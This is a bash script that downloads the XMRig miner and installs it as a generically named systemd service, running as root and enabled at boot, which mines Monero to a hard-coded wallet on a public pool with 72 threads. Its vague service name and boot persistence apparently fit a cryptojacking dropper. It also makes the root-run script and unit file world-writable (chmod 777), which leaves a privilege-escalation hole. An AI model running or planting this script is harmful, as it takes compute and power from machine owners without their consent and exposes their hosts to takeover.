#!/bin/bash
sleep 10 ;
sudo touch /etc/systemd/system/script.service ;
sudo touch /usr/local/bin/script.sh ;
sudo chmod 777 /etc/systemd/system/script.service ;
sudo chmod 777 /usr/local/bin/script.sh ;
wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar zxvf xmrig-6.18.0-linux-x64.tar.gz ;

sudo echo "#!/bin/bash
./xmrig-6.18.0/xmrig -a randomx -o xmr.2miners.com:2222 -u 4851tkCPpMvFzGEPWWMamuSuwGh56vh3PUAxXYrSmX2mSRAgDPMTnS9Z7DLz1futnhRubjBpj7WsCLMy6SxGDJTMQuwZRxt.test --coin monero --threads=72" > /usr/local/bin/script.sh ;

sudo echo "[Unit]
Description=Script
After=network.target
[Service]
ExecStart=/usr/local/bin/script.sh
Type=simple
Restart=no
User=root
WorkingDirectory=/
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/script.service;

sudo systemctl daemon-reload;
sudo systemctl start script.service;
sudo systemctl enable script.service;'
